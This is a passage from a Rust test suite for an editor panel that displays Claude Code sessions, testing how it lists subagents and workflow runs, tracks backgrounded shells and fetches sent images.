        // no workspace to open a tab in.
        panel.update(cx, |panel, cx| {
            panel.show_the_newest_of_another_conversation();
            panel
                .store
                .update(cx, |store, cx| store.select_transcript_target(target, cx));
        });
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();
    }

    /// The bytes of a sent image are nowhere in the transcript: the delivery records a
    /// path on the machine the session runs on, so the panel has to go and fetch it, and
    /// it has to fetch it as that session — the far end decides what a session may hand
    /// back from the session's own registration.
    #[gpui::test]
    async fn a_sent_image_is_fetched_from_the_machine_the_session_runs_on(
        cx: &mut gpui::TestAppContext,
    ) {
        let session_lines = [
            chained_line(
                ASSISTANT_RECORD_TYPE,
                "a1",
                None,
                false,
                serde_json::json!([{
                    "type": "tool_use",
                    "id": "call-1",
                    "name": "SendUserFile",
                    "input": { "files": ["/scripted-project/renders/poster.png"] },
                }]),
            ),
            serde_json::json!({
                "type": USER_RECORD_TYPE,
                "uuid": "u1",
                "parentUuid": "a1",
                "isSidechain": false,
                "message": { "content": [ {
                    "type": "tool_result",
                    "tool_use_id": "call-1",
                    "content": "1 file delivered to user.",
                } ] },
                "toolUseResult": {
                    "caption": "the poster",
                    "display": "attach",
                    "attachments": [{
                        "path": "/scripted-project/renders/poster.png",
                        "size": 2048,
                        "isImage": true,
                        "media_type": "image/png",
                    }],
                },
            })
            .to_string(),
        ];
        let source: Arc<dyn SessionSource> = Arc::new(
            ScriptedSource::new(&session_lines, &[])
                .with_attachment(b"\x89PNG\r\n\x1a\nthe poster".to_vec()),
        );
        let panel = scripted_panel_over(source, cx);
        read_the_scripted_session(&panel, cx);

        let sent = panel.read_with(cx, |panel, _| {
            panel.entries.iter().find_map(|entry| match &entry.kind {
                EntryKind::SentFiles { files, .. } => {
                    files.first().map(|file| (entry.key.clone(), file.clone()))
                }
                _ => None,
            })
        });
        let (key, file) = sent.expect("the delivery must be shown as the file it delivered");
        let file_key = sent_file_key(&key, 0);

        panel.update(cx, |panel, cx| {
            panel.load_sent_image(file_key.clone(), &file, 0, cx)
        });
        cx.run_until_parked();

        let fetched = panel.read_with(cx, |panel, _| {
            match panel.loaded_attachments.get(&file_key) {
                Some(AttachmentLoad::Loaded(image)) => Ok(image.bytes().len()),
                Some(AttachmentLoad::Failed(error)) => Err(error.to_string()),
                Some(AttachmentLoad::Loading) => Err("still loading".to_string()),
                None => Err("nothing was fetched".to_string()),
            }
        });

        assert_eq!(
            fetched,
            Ok(b"\x89PNG\r\n\x1a\nthe poster".len()),
            "the image the session sent must arrive whole"
        );
    }

    /// The bug this is about: an agent that has returned leaves its own conversation
    /// ending in a call nothing answered, so reading the activity off the conversation on
    /// screen leaves `Running …` pulsing above an input the reader cannot even type into.
    #[gpui::test]
    async fn an_agent_that_has_returned_does_not_pulse_running_above_the_input(
        cx: &mut gpui::TestAppContext,
    ) {
        let session_lines = [
            chained_line(
                USER_RECORD_TYPE,
                "m1",
                None,
                false,
                serde_json::json!("go on"),
            ),
            chained_line(
                ASSISTANT_RECORD_TYPE,
                "m2",
                Some("m1"),
                false,
                serde_json::json!([{ "type": "text", "text": "all done." }]),
            ),
        ];
        let agent_lines = [
            chained_line(
                USER_RECORD_TYPE,
                "s1",
                None,
                true,
                serde_json::json!("read the file"),
            ),
            unanswered_bash_call("s2", Some("s1"), true),
        ];

        let panel = scripted_panel(&session_lines, &agent_lines, cx);
        read_the_scripted_session(&panel, cx);
        read_the_conversation_of(scripted_agent(), &panel, cx);

        panel.read_with(cx, |panel, _| {
            assert_eq!(
                panel.activity,
                Activity::Idle,
                "the session has answered and is doing nothing; the unanswered call is in \
                 the returned agent's conversation, not in the session's"
            );
        });
    }

    #[gpui::test]
    async fn the_activity_line_reads_the_session_and_not_the_agent_on_screen(
        cx: &mut gpui::TestAppContext,
    ) {
        let session_lines = [
            chained_line(
                USER_RECORD_TYPE,
                "m1",
                None,
                false,
                serde_json::json!("go on"),
            ),
            chained_line(
                ASSISTANT_RECORD_TYPE,
                "m2",
                Some("m1"),
                false,
                serde_json::json!([{ "type": "thinking", "thinking": "weighing it up" }]),
            ),
        ];
        let agent_lines = [
            chained_line(
                USER_RECORD_TYPE,
                "s1",
                None,
                true,
                serde_json::json!("read the file"),
            ),
            unanswered_bash_call("s2", Some("s1"), true),
        ];

        let panel = scripted_panel(&session_lines, &agent_lines, cx);
        read_the_scripted_session(&panel, cx);
        read_the_conversation_of(scripted_agent(), &panel, cx);

        panel.read_with(cx, |panel, _| {
            assert_eq!(
                panel.activity,
                Activity::Thinking,
                "the line says what this session is doing, and it is thinking whichever \
                 conversation the reader has open"
            );
        });
    }

    /// The bookkeeping of a pending message is written in the keys
    /// [`build_entries`] gives the records, and [`user_message_entries`] reads the same
    /// records without deriving the rest of the conversation. The two must agree key for
    /// key, or a pending message is measured against one set of keys and paired against
    /// another.
    #[test]
    fn the_user_messages_read_off_a_path_are_the_ones_the_built_entries_carry() {
        let lines = [
            user_message_line("u1", "a message with string content"),
            serde_json::json!({
                "type": "user",
                "uuid": "u2",
                "message": { "content": [
                    { "type": "tool_result", "tool_use_id": "call-1", "content": "done" },
                    { "type": "text", "text": "a message after a result" },
                ] },
            })
            .to_string(),
            user_message_line(
                "u3",
                "<command-name>/goal</command-name>\n<command-args>ship it</command-args>",
            ),
            user_message_line(
                "u4",
                "<system-reminder>nothing the user typed</system-reminder>",
            ),
            serde_json::json!({
                "type": "user",
                "uuid": "u5",
                "isCompactSummary": true,
                "message": { "content": "a recap of the conversation" },
            })
            .to_string(),
            serde_json::json!({
                "type": "user",
                "uuid": "u6",
                "subtype": LOCAL_COMMAND_SUBTYPE,
                "content": "the output of a command the user ran",
            })
            .to_string(),
            serde_json::json!({
                "type": ATTACHMENT_RECORD_TYPE,
                "uuid": "u7",
                "content": "context Claude Code assembled",
            })
            .to_string(),
            serde_json::json!({
                "type": "assistant",
                "uuid": "u8",
                "message": { "content": [{ "type": "text", "text": "the model's own words" }] },
            })
            .to_string(),
            // No uuid, so it is keyed by its position in the path.
            serde_json::json!({
                "type": "user",
                "message": { "content": "a message no record can reference" },
            })
            .to_string(),
        ];

        let records: Vec<TranscriptRecord> = lines.iter().map(|line| record(line)).collect();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        let built = build_entries(&path, Some(paths::home_dir()), &mut EntryCache::default());

        assert_eq!(
            user_messages(&user_message_entries(&path)),
            user_messages(&built),
            "the pairing of a pending message reads these keys, so they must be the keys \
             the drawn conversation carries"
        );
        assert!(
            !user_messages(&built).is_empty(),
            "a fixture with no user messages in it would hold nothing together"
        );
    }

    /// A run can spawn any number of agents, so the list has to say which run each agent
    /// came from rather than laying them out beside the session's own agents.
    #[test]
    fn a_workflow_runs_agents_are_grouped_under_the_run_that_spawned_them() {
        let mut plain = subagent("a0", None, Some("toolu_01"));
        plain.meta.description = Some("look at the file".to_string());
        let mut first_of_run = subagent("a1", Some("wf_d276fc57-977"), None);
        first_of_run.meta.description = Some("stage-A".to_string());
        first_of_run.meta.workflow_phase = Some("Wait A".to_string());
        // Returned, so it is counted by the heading and drawn nowhere; see
        // `an_agent_that_has_returned_is_taken_off_the_session_list`.
        first_of_run.workflow_agent_finished = Some(true);
        let mut second_of_run = subagent("a2", Some("wf_d276fc57-977"), None);
        second_of_run.meta.description = Some("stage-B".to_string());
        second_of_run.meta.workflow_phase = Some("Wait B".to_string());
        second_of_run.workflow_agent_finished = Some(false);

        let rows = session_agent_rows(
            &[plain, first_of_run, second_of_run],
            &[],
            &[],
            &READING_NOTHING,
        );

        assert_eq!(
            rows,
            vec![
                SessionAgentRow::Agent {
                    label: SharedString::from("look at the file"),
                    note: None,
                    indent_level: 1,
                    target: TranscriptTarget::Subagent {
                        agent_id: "a0".to_string(),
                        workflow_run_id: None,
                    },
                },
                SessionAgentRow::WorkflowRun {
                    label: SharedString::from("Workflow d276fc57-977"),
                    note: SharedString::from("1/2 done"),
                },
                SessionAgentRow::Agent {
                    label: SharedString::from("stage-B"),
                    note: Some(SharedString::from("Running · Wait B")),
                    indent_level: 2,
                    target: TranscriptTarget::Subagent {
                        agent_id: "a2".to_string(),
                        workflow_run_id: Some("wf_d276fc57-977".to_string()),
                    },
                },
            ],
            "the session's own agent stays at the top level and the run's one agent still \
             working sits under a heading counting both of them"
        );
    }

    /// A `Task` agent's row must not claim to know whether it is over: the list reads no
    /// conversation but the selected session's, and that is where the answer is.
    #[test]
    fn only_a_workflow_agents_row_says_whether_it_has_returned() {
        let plain = subagent("a0", None, Some("toolu_01"));
        assert_eq!(session_agent_row_note(&plain), None);

        let mut of_run = subagent("a1", Some("wf_1"), None);
        of_run.workflow_agent_finished = Some(false);
        assert_eq!(
            session_agent_row_note(&of_run),
            Some(SharedString::from("Running")),
            "a run's agent is known to be running from the journal, with no phase to name"
        );
    }

    /// Two runs are two headings; one run's agents must not be counted into the other's.
    #[test]
    fn two_runs_are_two_groups() {
        let first = subagent("a1", Some("wf_1"), None);
        let mut second = subagent("a2", Some("wf_2"), None);
        second.workflow_agent_finished = Some(false);

        let rows = session_agent_rows(&[first, second], &[], &[], &READING_NOTHING);

        assert_eq!(
            headings_of(&rows),
            vec![("Workflow 1", "0/1 done"), ("Workflow 2", "0/1 done")],
            "each run counts only its own agents"
        );
    }

    /// The target of a view that is reading a session's own conversation, which is what
    /// the dock reads and what every session but the selected one is drawn against.
    const READING_NOTHING: TranscriptTarget = TranscriptTarget::Main;

    fn headings_of(rows: &[SessionAgentRow]) -> Vec<(&str, &str)> {
        rows.iter()
            .filter_map(|row| match row {
                SessionAgentRow::WorkflowRun { label, note } => {
                    Some((label.as_ref(), note.as_ref()))
                }
                SessionAgentRow::Agent { .. } | SessionAgentRow::Shell { .. } => None,
            })
            .collect()
    }

    fn labels_of(rows: &[SessionAgentRow]) -> Vec<&str> {
        rows.iter()
            .filter_map(|row| match row {
                SessionAgentRow::Agent { label, .. } => Some(label.as_ref()),
                SessionAgentRow::WorkflowRun { .. } | SessionAgentRow::Shell { .. } => None,
            })
            .collect()
    }

    /// A row is a way into a conversation, and a conversation that has stopped changing
    /// is not one the list goes on offering. The run's heading still counts the agent,
    /// because it is gone from the list rather than from the run.
    #[test]
    fn an_agent_that_has_returned_is_taken_off_the_session_list() {
        let mut returned = subagent("a1", Some("wf_1"), None);
        returned.meta.description = Some("stage-A".to_string());
        returned.workflow_agent_finished = Some(true);
        let mut working = subagent("a2", Some("wf_1"), None);
        working.meta.description = Some("stage-B".to_string());
        working.workflow_agent_finished = Some(false);

        let rows = session_agent_rows(&[returned, working], &[], &[], &READING_NOTHING);

        assert_eq!(labels_of(&rows), vec!["stage-B"]);
        assert_eq!(
            headings_of(&rows),
            vec![("Workflow 1", "1/2 done")],
            "the heading counts what the run spawned, not what is left on the list"
        );
    }

    /// A run every agent of which has returned would be a heading with nothing under it,
    /// which is a row that opens nothing.
    #[test]
    fn a_run_that_is_over_leaves_the_session_list_entirely() {
        let mut only = subagent("a1", Some("wf_1"), None);
        only.workflow_agent_finished = Some(true);

        assert_eq!(
            session_agent_rows(&[only], &[], &[], &READING_NOTHING),
            Vec::new()
        );
    }

    /// Taking the row of the conversation on screen away from under the reader would
    /// leave them looking at something no control admits exists.
    #[test]
    fn the_agent_being_read_keeps_its_row_after_it_returns() {
        let mut returned = subagent("a1", Some("wf_1"), None);
        returned.meta.description = Some("stage-A".to_string());
        returned.workflow_agent_finished = Some(true);

        let reading_it = TranscriptTarget::Subagent {
            agent_id: "a1".to_string(),
            workflow_run_id: Some("wf_1".to_string()),
        };
        let rows = session_agent_rows(&[returned], &[], &[], &reading_it);

        assert_eq!(labels_of(&rows), vec!["stage-A"]);
    }

    /// A `Task` agent is only known to be over from the tool result in its own session's
    /// conversation, and the list holds that conversation for one session at a time. An
    /// agent of any other session must be offered rather than hidden on a guess.
    #[test]
    fn a_task_agent_of_an_unread_session_is_offered() {
        let mut agent = subagent("a0", None, Some("toolu_01"));
        agent.meta.description = Some("look at the file".to_string());

        assert_eq!(
            labels_of(&session_agent_rows(&[agent], &[], &[], &READING_NOTHING)),
            vec!["look at the file"],
        );
    }

    /// The scan orders by agent id, so two runs can be interleaved in the input. Grouping
    /// walks first-seen run ids and then collects every agent of that run, not only a
    /// contiguous slice.
    #[test]
    fn a_runs_agents_are_grouped_even_when_they_are_not_adjacent() {
        let first_of_first = subagent("a1", Some("wf_1"), None);
        let only_of_second = subagent("a2", Some("wf_2"), None);
        let second_of_first = subagent("a3", Some("wf_1"), None);

        let rows = session_agent_rows(
            &[first_of_first, only_of_second, second_of_first],
            &[],
            &[],
            &READING_NOTHING,
        );

        let outline: Vec<String> = rows
            .iter()
            .map(|row| match row {
                SessionAgentRow::WorkflowRun { label, .. } => format!("run:{label}"),
                SessionAgentRow::Agent { target, .. } => match target {
                    TranscriptTarget::Subagent { agent_id, .. } => {
                        format!("agent:{agent_id}")
                    }
                    TranscriptTarget::Main => "main".to_string(),
                },
                SessionAgentRow::Shell { label, .. } => format!("shell:{label}"),
            })
            .collect();
        assert_eq!(
            outline,
            vec![
                "run:Workflow 1".to_string(),
                "agent:a1".to_string(),
                "agent:a3".to_string(),
                "run:Workflow 2".to_string(),
                "agent:a2".to_string(),
            ],
            "both of wf_1's agents sit under its heading even though a2 was between them \
             in the input; got {outline:?}"
        );
    }

    /// The result Claude Code writes for a `Bash` call it left running in the background,
    /// verbatim in shape: the announcement the reader is shown, and the `backgroundTaskId`
    /// beside it that names the shell.
    fn background_launch_line(
        uuid: &str,
        tool_use_id: &str,
        task_id: &str,
        output_path: &str,
    ) -> String {
        serde_json::json!({
            "type": "user",
            "uuid": uuid,
            "message": { "content": [{
                "type": "tool_result",
                "tool_use_id": tool_use_id,
                "content": format!(
                    "Command running in background with ID: {task_id}. Output is being \
                     written to: {output_path}. You will be notified when it completes. \
                     To check interim output, use Read on that file path.",
                ),
            }] },
            "toolUseResult": { "stdout": "", "backgroundTaskId": task_id },
        })
        .to_string()
    }

    /// The notification Claude Code queues into the conversation when a background command
    /// ends, which is the only record that it did.
    fn task_notification_line(uuid: &str, task_id: &str, status: &str) -> String {
        user_message_line(
            uuid,
            &format!(
                "<task-notification>\n<task-id>{task_id}</task-id>\n<status>{status}</status>\n\
                 </task-notification>",
            ),
        )
    }

    /// The same notification as [`task_notification_line`], in the shape Claude Code
    /// writes when it arrived while a turn was running and was absorbed into that turn
    /// rather than delivered as a message of its own. Most shells end this way: the
    /// session is usually working when the command it backgrounded finishes.
    fn absorbed_task_notification_line(uuid: &str, parent_uuid: &str, task_id: &str) -> String {
        serde_json::json!({
            "type": "attachment",
            "uuid": uuid,
            "parentUuid": parent_uuid,
            "attachment": {
                "type": "queued_command",
                "commandMode": "task-notification",
                "prompt": format!(
                    "<task-notification>\n<task-id>{task_id}</task-id>\n\
                     <status>completed</status>\n</task-notification>",
                ),
            },
        })
        .to_string()
    }

    fn shells_of(json_lines: &[String]) -> Vec<BackgroundShell> {
        let records: Vec<TranscriptRecord> = json_lines
            .iter()
            .map(|line| record(line.as_str()))
            .collect();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        background_shells(&path)
    }

    /// A backgrounded command writes to a file and says nothing more in the conversation,
    /// so without this the panel shows a session that looks idle while it is running work.
    #[test]
    fn a_backgrounded_bash_call_is_listed_as_the_shell_it_started() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({
                    "command": "pnpm test",
                    "description": "Run the suite",
                    "run_in_background": true,
                }),
            ),
            background_launch_line("m2", "toolu_01", "b7q64rk1n", "/tmp/tasks/b7q64rk1n.output"),
        ];

        assert_eq!(
            shells_of(&lines),
            vec![BackgroundShell {
                task_id: SharedString::from("b7q64rk1n"),
                label: SharedString::from("Run the suite"),
                command: Some(SharedString::from("pnpm test")),
                output_path: Some(SharedString::from("/tmp/tasks/b7q64rk1n.output")),
                finished: false,
            }],
            "the call says what the shell is for and where its output goes; all of that \
             has to survive into the row"
        );
    }

    /// The panel offers what is still running, exactly as it does for agents: a session
    /// that has backgrounded twenty commands would otherwise bury the one still going.
    #[test]
    fn a_shell_the_notification_has_ended_is_not_offered() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "sleep 1", "description": "Wait" }),
            ),
            background_launch_line("m2", "toolu_01", "b1", "/tmp/tasks/b1.output"),
            tool_use_line(
                "m3",
                "toolu_02",
                "Bash",
                serde_json::json!({ "command": "sleep 2", "description": "Wait longer" }),
            ),
            background_launch_line("m4", "toolu_02", "b2", "/tmp/tasks/b2.output"),
            task_notification_line("m5", "b1", "completed"),
        ];
        let shells = shells_of(&lines);

        assert_eq!(
            shells
                .iter()
                .map(|shell| (shell.task_id.as_ref(), shell.finished))
                .collect::<Vec<_>>(),
            vec![("b1", true), ("b2", false)],
            "the notification ends the shell it names and no other"
        );
        assert_eq!(
            session_agent_rows(&[], &shells, &[], &READING_NOTHING),
            vec![SessionAgentRow::Shell {
                label: SharedString::from("Wait longer"),
                note: SharedString::from("Running"),
            }],
            "only the shell still running is drawn"
        );
    }

    /// A shell that failed or was killed is over as much as one that succeeded, and a row
    /// that went on pulsing for it would be the panel claiming work was still happening.
    #[test]
    fn a_shell_that_ended_badly_is_over_too() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "x" }),
            ),
            background_launch_line("m2", "toolu_01", "b1", "/tmp/tasks/b1.output"),
            task_notification_line("m3", "b1", "failed"),
        ];

        assert!(
            shells_of(&lines)
                .first()
                .is_some_and(|shell| shell.finished),
            "whichever way it ended, it is not running"
        );
    }

    /// Taken from a real session: of the twelve shells it backgrounded, eleven ended with
    /// the session mid-turn and so were recorded only this way. Reading the delivered
    /// message alone left every one of them pulsing as though it were still running.
    #[test]
    fn a_notification_absorbed_into_a_running_turn_ends_its_shell_too() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "pnpm test" }),
            ),
            background_launch_line("m2", "toolu_01", "b1", "/tmp/tasks/b1.output"),
            absorbed_task_notification_line("m3", "m2", "b1"),
        ];

        assert!(
            shells_of(&lines)
                .first()
                .is_some_and(|shell| shell.finished),
            "the shell ended; the shape the notification was written in does not change \
             whether it did"
        );
    }

    /// Words a reader typed are not a record of anything ending, however closely they
    /// quote one.
    #[test]
    fn a_reader_quoting_a_notification_does_not_end_a_shell() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "x" }),
            ),
            background_launch_line("m2", "toolu_01", "b1", "/tmp/tasks/b1.output"),
            user_message_line(
                "m3",
                "did you see <task-notification><task-id>b1</task-id></task-notification> go by?",
            ),
        ];

        assert!(
            shells_of(&lines)
                .first()
                .is_some_and(|shell| !shell.finished),
            "a notification is a message of its own, not a phrase inside one"
        );
    }

    /// A `Bash` call that was waited on has no shell behind it: its answer is in the
    /// conversation already.
    #[test]
    fn an_ordinary_bash_call_starts_no_shell() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "ls" }),
            ),
            tool_result_line_with_content("m2", "toolu_01", "README.md"),
        ];

        assert_eq!(shells_of(&lines), Vec::new());
    }

    /// Claude Code does not always record a description, and a row reading `Shell b7q6…`
    /// tells a reader nothing about what their machine is busy with.
    #[test]
    fn a_shell_with_no_description_is_named_by_the_head_of_its_command() {
        let command = "cd /very/long/path/somewhere && pnpm run build --filter app\nrm -rf dist";
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": command }),
            ),
            background_launch_line("m2", "toolu_01", "b1", "/tmp/tasks/b1.output"),
        ];

        let label = shells_of(&lines)
            .first()
            .map(|shell| shell.label.to_string())
            .unwrap_or_default();
        assert!(
            label.starts_with("cd /very/long/path/somewhere"),
            "the head of the first line is what names the call; got {label:?}"
        );
        assert!(
            !label.contains("rm -rf dist"),
            "a label is one line of a row, not the whole script; got {label:?}"
        );
        assert!(
            label.chars().count() <= SHELL_LABEL_CHARACTERS + 1,
            "a label wider than the dock pushes the note off the row; got {label:?}"
        );
    }

    /// Nothing in the conversation pairs the announcement with the call when the call
    /// itself has been compacted away, and a shell dropped for that reason is a running
    /// command the reader is never told about.
    #[test]
    fn a_shell_whose_call_is_gone_is_still_listed() {
        let lines = [background_launch_line(
            "m1",
            "toolu_01",
            "b1",
            "/tmp/tasks/b1.output",
        )];

        assert_eq!(
            shells_of(&lines),
            vec![BackgroundShell {
                task_id: SharedString::from("b1"),
                label: SharedString::from("Shell b1"),
                command: None,
                output_path: Some(SharedString::from("/tmp/tasks/b1.output")),
                finished: false,
            }],
            "the announcement alone is enough to say a shell is running"
        );
    }

    /// The shells go below every row that opens something, so that a row which opens
    /// nothing is not mistaken for one that failed to.
    #[test]
    fn shells_are_listed_below_the_agents_of_the_same_session() {
        let mut agent = subagent("a0", None, Some("toolu_01"));
        agent.meta.description = Some("read the file".to_string());
        let shell = BackgroundShell {
            task_id: SharedString::from("b1"),
            label: SharedString::from("Watch the log"),
            command: None,
            output_path: None,
            finished: false,
        };

        let rows = session_agent_rows(&[agent], &[shell], &[], &READING_NOTHING);

        assert_eq!(
            rows.last(),
            Some(&SessionAgentRow::Shell {
                label: SharedString::from("Watch the log"),
                note: SharedString::from("Running"),
            }),
        );
        assert_eq!(rows.len(), 2, "the agent keeps its own row; got {rows:?}");
    }

    /// A task id names a shell, not a slot that stays dead after the first one ended.
    #[test]
    fn a_shell_started_after_its_ids_notification_is_still_running() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "first", "description": "First" }),
            ),
            background_launch_line("m2", "toolu_01", "b1", "/tmp/tasks/b1.output"),
            task_notification_line("m3", "b1", "completed"),
            tool_use_line(
                "m4",
                "toolu_02",
                "Bash",
                serde_json::json!({ "command": "second", "description": "Second" }),
            ),
            background_launch_line("m5", "toolu_02", "b1", "/tmp/tasks/b1-again.output"),
        ];
        let shells = shells_of(&lines);
        let got: Vec<(&str, &str, bool)> = shells
            .iter()
            .map(|shell| (shell.task_id.as_ref(), shell.label.as_ref(), shell.finished))
            .collect();

        assert_eq!(
            got,
            vec![("b1", "First", true), ("b1", "Second", false)],
            "the notification ends the shell that was already running, not one started \
             after it"
        );
    }

    /// Pasting a notification and then asking about it is still the reader's words,
    /// however completely they quoted it at the start of the message.
    #[test]
    fn a_reader_pasting_a_notification_then_asking_does_not_end_a_shell() {
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "x" }),
            ),
            background_launch_line("m2", "toolu_01", "b1", "/tmp/tasks/b1.output"),
            user_message_line(
                "m3",
                "<task-notification>\n<task-id>b1</task-id>\n<status>completed</status>\n\
                 </task-notification>\n\nwhy did this fail?",
            ),
        ];
        let got = shells_of(&lines).first().map(|shell| shell.finished);

        assert_eq!(
            got,
            Some(false),
            "the extra question is the reader's, so the shell is still running"
        );
    }

    /// A record can answer more than one call, and the backgrounded `Bash` is not
    /// always the first of them.
    #[test]
    fn a_backgrounded_bash_result_behind_another_tool_result_still_names_the_shell() {
        let announcement = "Command running in background with ID: b1. Output is being \
             written to: /tmp/tasks/b1.output. You will be notified when it completes. \
             To check interim output, use Read on that file path.";
        let lines = [
            tool_use_line(
                "m0",
                "toolu_read",
                "Read",
                serde_json::json!({ "file_path": "a.rs" }),
            ),
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({
                    "command": "pnpm test",
                    "description": "Run the suite",
                }),
            ),
            serde_json::json!({
                "type": "user",
                "uuid": "m2",
                "message": { "content": [
                    {
                        "type": "tool_result",
                        "tool_use_id": "toolu_read",
                        "content": "fn main() {}",
                    },
                    {
                        "type": "tool_result",
                        "tool_use_id": "toolu_01",
                        "content": announcement,
                    },
                ] },
                "toolUseResult": { "stdout": "", "backgroundTaskId": "b1" },
            })
            .to_string(),
        ];

        assert_eq!(
            shells_of(&lines),
            vec![BackgroundShell {
                task_id: SharedString::from("b1"),
                label: SharedString::from("Run the suite"),
                command: Some(SharedString::from("pnpm test")),
                output_path: Some(SharedString::from("/tmp/tasks/b1.output")),
                finished: false,
            }],
            "the backgrounded call is the one whose result announced the shell, not \
             whichever tool_result happens to sit first"
        );
    }

    /// The path is taken as a string up to the sentence that follows it, not cut at the
    /// first `. `.
    #[test]
    fn a_shell_output_path_that_contains_dot_space_is_kept_whole() {
        let output_path = "/tmp/my. tasks/b1.output";
        let lines = [
            tool_use_line(
                "m1",
                "toolu_01",
                "Bash",
                serde_json::json!({ "command": "x" }),
            ),
            background_launch_line("m2", "toolu_01", "b1", output_path),
        ];
        let got = shells_of(&lines)
            .first()
            .and_then(|shell| shell.output_path.as_deref().map(str::to_string));

        assert_eq!(
            got.as_deref(),
            Some(output_path),
            "a `. ` inside the path is still the path, not the end of it"
        );
    }

    /// The phase is said once above the cards rather than repeated on each of them.
    #[test]
    fn a_workflow_calls_cards_are_grouped_into_the_phases_they_belong_to() {
        let mut first = card(AgentState::Finished);
        first.phase = Some(SharedString::from("Wait A"));
        let mut second = card(AgentState::Running);
        second.phase = Some(SharedString::from("Wait B"));
        let mut third = card(AgentState::Running);
        third.phase = Some(SharedString::from("Wait B"));

        let groups = group_cards_by_phase(vec![first, second, third], true);

        assert_eq!(
            groups
                .iter()
                .map(|(phase, cards)| (phase.as_ref().map(SharedString::as_ref), cards.len()))
                .collect::<Vec<_>>(),
            vec![(Some("Wait A"), 1), (Some("Wait B"), 2)]
        );
        assert!(
            groups
                .iter()
                .all(|(_, cards)| cards.iter().all(|card| card.phase.is_none())),
            "the phase moves to the heading, so a card under one does not repeat it"
        );
        assert_eq!(
            phase_heading(&SharedString::from("Wait B"), &groups[1].1),
            SharedString::from("Wait B · 0/2 done")
        );
    }

    /// An `Agent` call spawns one agent and has no phases; grouping must leave it alone.
    #[test]
    fn a_plain_agent_calls_cards_are_not_grouped() {
        let mut only = card(AgentState::Running);
        only.phase = Some(SharedString::from("Wait A"));

        let groups = group_cards_by_phase(vec![only], false);

        assert_eq!(groups.len(), 1);
        assert_eq!(
            groups[0].0, None,
            "no heading is drawn for a call with no run"
        );
        assert_eq!(
            groups[0].1[0].phase,
            Some(SharedString::from("Wait A")),
            "and the card keeps whatever it said"
        );
    }

    /// Captured from a real `parallel()` run: `Fan out` spawned three agents and `Collect`
    /// one, and sorted by agent id the `Collect` agent lands between two of the `Fan out`
    /// ones. A phase must be one heading however its agents are interleaved.
    #[test]
    fn a_phase_whose_agents_are_not_adjacent_is_still_one_heading() {
        let phases_in_agent_id_order = ["Fan out", "Fan out", "Collect", "Fan out"];
        let cards: Vec<AgentCardRow> = phases_in_agent_id_order
            .iter()
            .map(|phase| {
                let mut card = card(AgentState::Finished);
                card.phase = Some(SharedString::from(*phase));
                card
            })
            .collect();

        let groups = group_cards_by_phase(cards, true);

        assert_eq!(
            groups
                .iter()
                .map(|(phase, cards)| (
                    phase.as_ref().map(SharedString::as_ref).unwrap_or("<none>"),
                    cards.len()
                ))
                .collect::<Vec<_>>(),
            vec![("Fan out", 3), ("Collect", 1)],
            "the run has two phases, so the reader must see two headings"
        );
    }

    /// A host that answers nothing, which is the shape of the failure being guarded
    /// against: an unanswered request is not an error, so nothing downstream is ever
    /// told that the answer it is drawing was never given.
    ///
    /// Delegates every other method to a [`ScriptedSource`], so that a store built on it
    /// differs from a working one in exactly one way.
    struct UnansweredListing {
        scripted: ScriptedSource,
        listing: ListingBehaviour,
        executor: gpui::BackgroundExecutor,
    }

    enum ListingBehaviour {
        /// The request is sent and never answered, and never refused either.
        NeverAnswered,
        /// The host refuses, which is the case the store already has a path for.
        Refused,
        /// The host answers, after taking `0` of its allowance.
        AnsweredAfter(Duration),
    }

    impl UnansweredListing {
        fn new(listing: ListingBehaviour, executor: gpui::BackgroundExecutor) -> Self {
            Self {
                scripted: ScriptedSource::new(&[], &[]),
                listing,
                executor,
            }
        }
    }

    impl SessionSource for UnansweredListing {
        fn list_sessions(
            &self,
            project_root: Option<PathBuf>,
        ) -> Task<anyhow::Result<SessionListing>> {
            match self.listing {
                ListingBehaviour::NeverAnswered => self.executor.spawn(async move {
                    std::future::pending::<anyhow::Result<SessionListing>>().await
                }),
                ListingBehaviour::Refused => Task::ready(Err(anyhow::anyhow!(
                    "the host refused to list its sessions"
                ))),
                ListingBehaviour::AnsweredAfter(delay) => {
                    let listed = self.scripted.list_sessions(project_root);
                    let executor = self.executor.clone();
                    self.executor.spawn(async move {
                        executor.timer(delay).await;
                        listed.await
                    })
                }
            }
        }

        fn tail_transcript(
            &self,
            session_id: String,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            self.scripted.tail_transcript(session_id, state)
        }

        fn list_subagents(&self, session_id: String) -> Task<anyhow::Result<Vec<SubagentSummary>>> {
            self.scripted.list_subagents(session_id)
        }

        fn list_subagents_for_sessions(
            &self,
            session_ids: Vec<String>,
        ) -> Task<anyhow::Result<HashMap<String, Vec<SubagentSummary>>>> {
            self.scripted.list_subagents_for_sessions(session_ids)
        }

        fn tail_events(
            &self,
            session_id: String,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            self.scripted.tail_events(session_id, state)
        }

        fn read_status(&self, session_id: String) -> Task<anyhow::Result<Option<String>>> {
            self.scripted.read_status(session_id)
        }

        fn install_hooks(&self) -> Task<anyhow::Result<HookInstallOutcome>> {
            self.scripted.install_hooks()
        }

        fn hooks_installed(&self) -> Task<anyhow::Result<bool>> {
            self.scripted.hooks_installed()
        }

        fn list_slash_commands(
            &self,
            project_root: Option<PathBuf>,
        ) -> Task<anyhow::Result<Vec<SlashCommand>>> {
            self.scripted.list_slash_commands(project_root)
        }

        fn list_session_files(
